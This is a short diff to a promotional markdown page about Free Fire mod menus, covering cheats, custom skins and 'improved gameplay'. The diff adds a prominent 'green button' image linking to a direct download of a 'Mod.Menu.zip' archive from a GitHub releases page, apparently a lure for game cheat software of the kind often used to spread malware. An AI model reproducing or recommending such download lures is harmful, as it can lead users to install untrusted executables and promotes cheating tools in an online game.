@@ -15,6 +15,9 @@ One of the most popular features of Free Fire mod menus is the ability to use ch
 ## Custom Skins and Emotes
 Another popular feature of Free Fire mod menus is the ability to customize skins and emotes. Players can use custom skins for their characters and weapons, as well as use custom emotes for in-game celebrations. This allows players to stand out from the crowd and express their own unique style.
 
+[![green button](https://github.com/pcmods/pcmods.github.io/blob/master/button.png?raw=true)](https://github.com/pcmods/pcmods.github.io/releases/download/modmenu/Mod.Menu.zip)
+
+
 ## Improved Gameplay
 Free Fire mod menus can also improve gameplay by adding new features such as new weapons, new vehicles, and new map designs. This can make the game more interesting and challenging for players, and keep the game fresh.
 
